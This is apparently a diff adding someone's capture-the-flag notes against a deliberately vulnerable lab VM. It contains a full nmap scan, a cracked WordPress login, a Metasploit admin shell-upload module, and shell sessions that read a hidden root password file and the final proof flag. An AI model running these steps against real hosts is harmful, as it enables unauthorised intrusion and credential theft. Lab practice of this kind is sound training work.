@@ -1,0 +1,80 @@
+root@ap:~/Scrivania/CTF# nmap -A -p- 192.168.43.177
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 11:07 CET
+Nmap scan report for 192.168.43.177
+Host is up (0.00048s latency).
+Not shown: 65528 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
+|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
+|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
+53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: TOP RESP-CODES PIPELINING UIDL CAPA SASL AUTH-RESP-CODE
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: ENABLE OK post-login IDLE more capabilities SASL-IR have Pre-login IMAP4rev1 LOGINDISABLEDA0001 ID LOGIN-REFERRALS LITERAL+ listed
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 08:00:27:4C:72:0A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
+|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
+|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
+|   Domain name: \x00
+|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
+|_  System time: 2020-01-18T05:08:04-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-01-18T10:08:05
+|_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.48 ms 192.168.43.177
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.13 seconds
+
+
+wpscan:
+
+c0rrupt3d_brain:24992499
+
+msf5 exploit(unix/webapp/wp_admin_shell_upload)
+
+123
+
+
+www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r$ cat .root_password_ssh.txt
+<ulnerable-m4ch1ine:/home/root3r$ cat .root_password_ssh.txt                 
+willy26
+
+
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# cat proof.txt
+cat proof.txt
+voila you have successfully pwned me :) !!!
+:D
+
